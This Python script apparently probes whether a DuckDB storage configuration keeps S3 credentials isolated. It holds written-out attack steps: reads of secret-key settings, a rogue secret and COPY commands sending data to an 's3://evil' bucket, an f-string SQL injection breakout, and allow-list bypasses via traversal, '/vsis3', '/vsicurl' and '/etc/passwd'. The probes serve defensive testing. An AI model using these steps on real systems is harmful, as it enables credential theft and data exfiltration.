"""Empirical probes for the DuckDB credential research ticket. Throwaway."""
import os
import sys
import duckdb

sys.path.insert(0, "/")
from storage import configure_storage  # current main implementation

EP = "tilprobe-s3:9000"
BASE_ENV = dict(TILCAYO_S3_ENDPOINT=EP, TILCAYO_S3_URL_STYLE="path", TILCAYO_S3_USE_SSL="false")
os.environ.update(BASE_ENV)


def run(con, sql):
    try:
        r = con.execute(sql).fetchall()
        return f"OK {r!r}"[:160]
    except Exception as e:
        return f"ERR {type(e).__name__}: {str(e).splitlines()[0]}"[:160]


def section(name):
    print(f"\n### {name}")


def current_impl():
    con = duckdb.connect()
    con.execute("LOAD httpfs")
    configure_storage(con, ["httpfs"])
    return con


def scrubbed(order):
    """Pop AWS_* from the environment, then create the secret from the popped values."""
    key = os.environ.get("AWS_ACCESS_KEY_ID", "")
    sec = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
    con = None
    if order == "after_load":
        con = duckdb.connect()
        con.execute("LOAD httpfs")
    for k in [k for k in os.environ if k.startswith("AWS_")]:
        del os.environ[k]
    if order == "before_connect":
        con = duckdb.connect()
        con.execute("LOAD httpfs")
    con.execute(f"""CREATE OR REPLACE SECRET tilcayo_s3 (TYPE S3, PROVIDER config,
        KEY_ID '{key}', SECRET '{sec}', REGION 'us-east-1', URL_STYLE 'path',
        USE_SSL false, ENDPOINT '{EP}')""")
    con.execute("SET lock_configuration = true")
    os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"] = key, sec  # restore for next probe
    return con


mode = sys.argv[1]
print("duckdb", duckdb.__version__)

if mode == "leak":
    for label, factory in [("current impl", current_impl),
                           ("scrub after LOAD httpfs", lambda: scrubbed("after_load")),
                           ("scrub before connect", lambda: scrubbed("before_connect"))]:
        section(label)
        con = factory()
        print("current_setting secret:", run(con, "SELECT current_setting('s3_secret_access_key')"))
        print("current_setting key_id:", run(con, "SELECT current_setting('s3_access_key_id')"))
        print("write s3:", run(con, "COPY (SELECT 42 AS x) TO 's3://data/in/probe.parquet'"))
        print("read s3:", run(con, "SELECT * FROM 's3://data/in/probe.parquet'"))
        print("allow_unredacted_secrets:", run(con, "SELECT current_setting('allow_unredacted_secrets')"))
        print("duckdb_secrets redacted:", run(con, "SELECT secret_string LIKE '%probe-secret%' FROM duckdb_secrets()"))
        print("which_secret:", run(con, "SELECT * FROM which_secret('s3://data/x', 's3')"))

elif mode == "create_secret":
    variants = {
        "lock only": [],
        "+ enable_external_access=false": ["SET enable_external_access = false"],
        "+ allow_persistent_secrets=false": ["SET allow_persistent_secrets = false"],
    }
    for label, extra in variants.items():
        section(label)
        con = duckdb.connect()
        con.execute("LOAD httpfs")
        for s in extra:
            print("pre:", s, run(con, s))
        try:
            configure_storage(con, ["httpfs"])
        except Exception as e:
            print("configure_storage ERR:", str(e).splitlines()[0][:140])
            continue
        print("CREATE SECRET:", run(con, f"""CREATE SECRET evil (TYPE S3, KEY_ID 'probeadmin',
            SECRET 'probe-secret-123', ENDPOINT '{EP}', URL_STYLE 'path', USE_SSL false, SCOPE 's3://evil')"""))
        print("exfil copy data->evil:", run(con, "COPY (SELECT * FROM 's3://data/in/probe.parquet') TO 's3://evil/stolen.parquet'"))
        print("DROP our secret:", run(con, "DROP SECRET tilcayo_s3"))
        print("CREATE PERSISTENT:", run(con, "CREATE PERSISTENT SECRET p2 (TYPE S3, KEY_ID 'a', SECRET 'b')"))

elif mode == "breakout":
    section("multi-statement via entrypoint-style f-string")
    con = current_impl()
    q = ("SELECT 1 AS a) TO '/tmp/decoy.csv'; "
         f"CREATE SECRET evil (TYPE S3, KEY_ID 'probeadmin', SECRET 'probe-secret-123', ENDPOINT '{EP}', URL_STYLE 'path', USE_SSL false, SCOPE 's3://evil'); "
         "COPY (SELECT * FROM 's3://data/in/probe.parquet') TO 's3://evil/breakout.parquet'; "
         "COPY (SELECT 1 AS a")
    print("execute:", run(con, f"COPY ({q}) TO 's3://data/out/job1/result.parquet'"))
    print("secrets now:", run(con, "SELECT name FROM duckdb_secrets()"))
    print("breakout object exists:", run(con, "SELECT count(*) FROM 's3://evil/breakout.parquet'"))
    section("single-statement guard via con.extract_statements")
    for sql in [q, "SELECT 1", "SELECT 1; SELECT 2", "CREATE SECRET x (TYPE S3)", "SELECT * FROM 's3://data/in/probe.parquet'"]:
        try:
            stmts = con.extract_statements(sql)
            print(f"{len(stmts)} stmt(s) types={[str(s.type) for s in stmts]} :: {sql[:50]!r}")
        except Exception as e:
            print(f"parse ERR {str(e).splitlines()[0][:80]} :: {sql[:50]!r}")

elif mode == "allowlist":
    section("secret first, then allow-list + enable_external_access=false + lock")
    con = duckdb.connect(config={"allow_persistent_secrets": False})
    con.execute("LOAD httpfs")
    key, sec = os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"]
    print("create secret:", run(con, f"""CREATE SECRET tilcayo_s3 (TYPE S3, PROVIDER config, KEY_ID '{key}',
        SECRET '{sec}', REGION 'us-east-1', URL_STYLE 'path', USE_SSL false, ENDPOINT '{EP}')"""))
    print("set allowed_directories:", run(con, "SET allowed_directories = ['s3://data/in/', 's3://data/out/job1/']"))
    print("disable external access:", run(con, "SET enable_external_access = false"))
    print("lock:", run(con, "SET lock_configuration = true"))
    print("read allowed s3 prefix:", run(con, "SELECT * FROM 's3://data/in/probe.parquet'"))
    print("write allowed s3 prefix:", run(con, "COPY (SELECT 1 AS a) TO 's3://data/out/job1/result.parquet'"))
    print("write outside prefix:", run(con, "COPY (SELECT 1 AS a) TO 's3://data/out/job2/result.parquet'"))
    print("read other bucket:", run(con, "SELECT * FROM 's3://evil/stolen.parquet'"))
    print("read local /storage.py:", run(con, "SELECT length(content) FROM read_text('/storage.py')"))
    print("read SA-token-like path:", run(con, "SELECT * FROM read_text('/etc/hostname')"))
    print("http fetch:", run(con, "SELECT * FROM read_text('http://example.com')"))
    print("concat bypass:", run(con, "SELECT * FROM read_parquet('s3://' || 'evil/stolen.parquet')"))
    print("CREATE SECRET:", run(con, f"CREATE SECRET evil (TYPE S3, KEY_ID 'probeadmin', SECRET 'probe-secret-123', ENDPOINT '{EP}', URL_STYLE 'path', USE_SSL false, SCOPE 's3://evil')"))
    print("exfil with own secret:", run(con, "COPY (SELECT * FROM 's3://data/in/probe.parquet') TO 's3://evil/stolen2.parquet'"))
    print("DROP our secret:", run(con, "DROP SECRET tilcayo_s3"))
    print("ATTACH:", run(con, "ATTACH '/tmp/x.db'"))
    print("INSTALL ext:", run(con, "INSTALL spatial"))

if mode in ("edges", "spatial"):
    section(f"{mode}: allow-list edge cases")
    con = duckdb.connect(config={"allow_persistent_secrets": False})
    con.execute("LOAD httpfs")
    if mode == "spatial":
        con.execute("LOAD spatial")
    key, sec = os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"]
    con.execute(f"""CREATE SECRET tilcayo_s3 (TYPE S3, PROVIDER config, KEY_ID '{key}',
        SECRET '{sec}', REGION 'us-east-1', URL_STYLE 'path', USE_SSL false, ENDPOINT '{EP}')""")
    if mode == "spatial":
        print("seed geojson:", run(con, "COPY (SELECT 1 AS id, ST_Point(1,2) AS geom) TO 's3://data/in/pts.geojson' (FORMAT GDAL, DRIVER 'GeoJSON')"))
        print("seed evil geojson:", run(con, "COPY (SELECT 1 AS id, ST_Point(1,2) AS geom) TO 's3://evil/pts.geojson' (FORMAT GDAL, DRIVER 'GeoJSON')"))
    con.execute("SET allowed_directories = ['s3://data/in/', 's3://data/out/job1/']")
    con.execute("SET enable_external_access = false")
    con.execute("SET lock_configuration = true")
    print("current_setting secret (env still set):", run(con, "SELECT current_setting('s3_secret_access_key')"))
    print("traversal in/../out/job2:", run(con, "COPY (SELECT 1 AS a) TO 's3://data/in/../out/job2/x.parquet'"))
    print("sibling prefix data/in2:", run(con, "SELECT * FROM 's3://data/in2/x.parquet'"))
    print("glob allowed:", run(con, "SELECT count(*) FROM glob('s3://data/in/*')"))
    print("glob bucket root:", run(con, "SELECT count(*) FROM glob('s3://data/*')"))
    if mode == "spatial":
        print("ST_Read allowed:", run(con, "SELECT count(*) FROM ST_Read('s3://data/in/pts.geojson')"))
        print("ST_Read other bucket:", run(con, "SELECT count(*) FROM ST_Read('s3://evil/pts.geojson')"))
        print("ST_Read /vsis3 bypass:", run(con, "SELECT count(*) FROM ST_Read('/vsis3/evil/pts.geojson')"))
        print("ST_Read local file:", run(con, "SELECT count(*) FROM ST_Read('/etc/passwd')"))
        print("ST_Read /vsicurl:", run(con, "SELECT count(*) FROM ST_Read('/vsicurl/http://example.com/x.geojson')"))
